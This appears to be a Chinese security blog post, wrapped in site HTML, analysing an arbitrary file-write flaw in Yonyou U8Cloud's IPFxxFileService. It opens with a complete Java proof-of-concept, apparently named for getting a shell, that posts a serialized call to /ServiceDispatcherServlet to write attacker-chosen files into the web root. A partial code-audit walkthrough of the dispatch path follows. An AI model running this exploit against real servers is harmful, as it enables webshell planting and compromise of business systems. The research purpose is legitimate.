@@ -1,0 +1,1077 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="exp3n5ive">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/10/26/用友 u8cloud ipfxxfileservice 文件上传漏洞分析/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="挺久之前复现的 , 当时网上还没有公开的 POC 所以一直没发出来 . 现在网上也陆陆续续都有文章分析过了 , 所以一并发出来 POC1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071">
+<meta property="og:type" content="article">
+<meta property="og:title" content="用友 U8Cloud IPFxxFileService 文件上传漏洞分析">
+<meta property="og:url" content="http://example.com/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="exp3n5ive&#39; Blog">
+<meta property="og:description" content="挺久之前复现的 , 当时网上还没有公开的 POC 所以一直没发出来 . 现在网上也陆陆续续都有文章分析过了 , 所以一并发出来 POC1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-10-26T03:24:24.417Z">
+<meta property="article:modified_time" content="2025-10-26T03:26:31.105Z">
+<meta property="article:author" content="exp3n5ive">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/bemd.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/bemd.ico">
+    <meta name="theme-color" content="#9EC4CC">
+    <link rel="shortcut icon" href="/images/bemd.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            用友 U8Cloud IPFxxFileService 文件上传漏洞分析 | exp3n5ive&#39; Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#9EC4CC","secondary":"#9EC4CC","default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":null},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":".","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"categories":{"path":"/categories/","icon":"fa-solid fa-layer-group"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"YYYY-MM-DD HH:mm:ss","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                exp3n5ive&#39; Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories/"
+                                        >
+                                    <i class="fa-solid fa-layer-group fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories/"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-solid fa-layer-group fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">用友 U8Cloud IPFxxFileService 文件上传漏洞分析</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/bemd.jpeg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">exp3n5ive</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-10-26 11:24:24</span>
+        <span class="mobile">2025-10-26 11:24:24</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-10-26 11:26:31</span>
+            <span class="mobile">2025-10-26 11:26:31</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>3.6k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>17 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>挺久之前复现的 , 当时网上还没有公开的 POC 所以一直没发出来 . 现在网上也陆陆续续都有文章分析过了 , 所以一并发出来</p>
+<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> nc.bs.framework.common.InvocationInfo;</span><br><span class="line"><span class="keyword">import</span> nc.bs.framework.comn.NetObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> nc.bs.framework.comn.NetObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> nc.bs.framework.comn.Result;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (args.length &lt; <span class="number">3</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Usage: java -jar U8Cloud_LT_20250917Patch_GetShell.jar &lt;URL&gt; &lt;content&gt; &lt;filename&gt;&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;Example: java -jar U8Cloud_LT_20250917Patch_GetShell.jar http://192.168.131.130:8088 \&quot;hello\&quot; abcd.txt&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">String</span> <span class="variable">urlString</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> args[<span class="number">1</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> args[<span class="number">2</span>];</span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(urlString + <span class="string">&quot;/ServiceDispatcherServlet&quot;</span>);</span><br><span class="line">            <span class="type">HttpURLConnection</span> <span class="variable">conn</span> <span class="operator">=</span> (HttpURLConnection)url.openConnection();</span><br><span class="line">            conn.setRequestMethod(<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">            conn.setDoInput(<span class="literal">true</span>);</span><br><span class="line">            conn.setDoOutput(<span class="literal">true</span>);</span><br><span class="line">            conn.setRequestProperty(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-java-serialized-object&quot;</span>);</span><br><span class="line">            conn.setRequestProperty(<span class="string">&quot;User-Agent&quot;</span>, <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0&quot;</span>);</span><br><span class="line">            conn.setRequestProperty(<span class="string">&quot;Accept&quot;</span>, <span class="string">&quot;*/*&quot;</span>);</span><br><span class="line">            conn.setRequestProperty(<span class="string">&quot;Accept-Language&quot;</span>, <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>);</span><br><span class="line">            conn.setRequestProperty(<span class="string">&quot;Accept-Encoding&quot;</span>, <span class="string">&quot;gzip, deflate&quot;</span>);</span><br><span class="line">            conn.setRequestProperty(<span class="string">&quot;X-Requested-With&quot;</span>, <span class="string">&quot;XMLHttpRequest&quot;</span>);</span><br><span class="line">            conn.setRequestProperty(<span class="string">&quot;Connection&quot;</span>, <span class="string">&quot;keep-alive&quot;</span>);</span><br><span class="line">            conn.setRequestProperty(<span class="string">&quot;Cookie&quot;</span>, <span class="string">&quot;flexsid=YzQ2MTZiZDgtYjkxNi00NjlmLTg3OGEtNzAwMTc2NWZkYTkw&quot;</span>);</span><br><span class="line">            conn.setRequestProperty(<span class="string">&quot;Priority&quot;</span>, <span class="string">&quot;u=0&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] filedata = content.getBytes(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">patch</span> <span class="operator">=</span> <span class="string">&quot;webapps/u8c_web/&quot;</span> + filename;</span><br><span class="line">            List&lt;String&gt; serviceNames = Arrays.asList(<span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;nc.itf.uap.pfxx.IPFxxFileService&quot;</span> &#125;);</span><br><span class="line">            List&lt;List&lt;String&gt;&gt; methodNames = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            methodNames.add(Arrays.asList(<span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;writeDocToXMLFile&quot;</span> &#125;));</span><br><span class="line">            List&lt;List&lt;Class&lt;?&gt;[]&gt;&gt; paramsClass = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            List&lt;Class&lt;?&gt;[]&gt; innerParamsClass = (List)<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            innerParamsClass.add(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; <span class="type">byte</span>[].class, String.class &#125;);</span><br><span class="line">            paramsClass.add(innerParamsClass);</span><br><span class="line">            List&lt;List&lt;Object[]&gt;&gt; params = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            List&lt;Object[]&gt; innerParams = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">            innerParams.add(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; filedata, patch &#125;);</span><br><span class="line">            params.add(innerParams);</span><br><span class="line">            List&lt;Map&lt;?, ?&gt;&gt; assinfo = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            assinfo.add(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;());</span><br><span class="line">            <span class="type">InvocationInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvocationInfo</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;nc.bs.framework.core.service.IHRMultiServicesInvorker&quot;</span>, <span class="string">&quot;multiStrServicesInvorker&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; List.class, List.class, List.class, List.class, List.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; serviceNames, methodNames, paramsClass, params, assinfo &#125;);</span><br><span class="line">            NetObjectOutputStream.writeObject(conn.getOutputStream(), info);</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> conn.getInputStream();</span><br><span class="line">            <span class="type">boolean</span>[] flags = &#123; <span class="literal">false</span>, <span class="literal">false</span> &#125;;</span><br><span class="line">            <span class="type">Result</span> <span class="variable">result</span> <span class="operator">=</span> (Result)NetObjectInputStream.readObject(in, flags);</span><br><span class="line">            <span class="keyword">if</span> (result.appexception != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.err.println(<span class="string">&quot;Attack Failed &quot;</span> + result.appexception.getMessage());</span><br><span class="line">                        result.appexception.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Attack Successful &quot;</span>+ urlString + <span class="string">&quot;/&quot;</span> + filename);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="文件写入分析"><a href="#文件写入分析" class="headerlink" title="文件写入分析"></a>文件写入分析</h2><p>通过 POST 方法向 &#x2F;ServiceDispatcherServlet 发送了一串序列化数据 , 在 U8CERP\framework\codegen.jar!\template\std21\web.vm 中 , 我们能找到该路由对应的 Servlet :</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1758549786817-0046724a-0e80-4b98-9a90-e1e8a8b9caa6.png"
+                     
+                ></p>
+<p>这个类位于 U8CERP\external\lib\fw.jar!nc.bs.framework.comn.serv.CommonServletDispatcher</p>
+<p>在它的 doGet 方法中调用了 serviceHandler 的 execCall 方法进行处理 :</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1758549911360-db154dc4-c648-4439-95d6-17443f078a4e.png"
+                     
+                ></p>
+<p>跟进 , 进入 U8CERP\external\lib\fw.jar!nc.bs.framework.comn.serv.ServiceDispatcher#execCall</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1758550212325-6c65fd48-7720-4ec3-aa2e-225e9e55bdc1.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1758550299505-6f6b6ed6-e40a-4315-82d5-1dd8e78382d8.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1758550388208-85a8f4b6-966b-410e-9aff-82400c0a54e1.png"
+                     
+                ></p>
+<p>关键的点就在这行代码 :</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">result.result = <span class="built_in">this</span>.invokeBeanMethod(</span><br><span class="line">    invInfo.getModule(), </span><br><span class="line">    invInfo.getServiceName(), </span><br><span class="line">    invInfo.getMethodName(),</span><br><span class="line">    invInfo.getParametertypes(),</span><br><span class="line">    invInfo.getParameters()</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>
+
+<p>根据 POC 中的 : </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1758550571534-4ad6f74e-9c9d-441c-9988-d5b7da54c646.png"
+                     
+                ></p>
+<p>我们知道 , 这里调用的就是 <code>nc.bs.framework.core.service.IHRMultiServicesInvorker</code> 的 <code>multiStrServicesInvorker</code> </p>
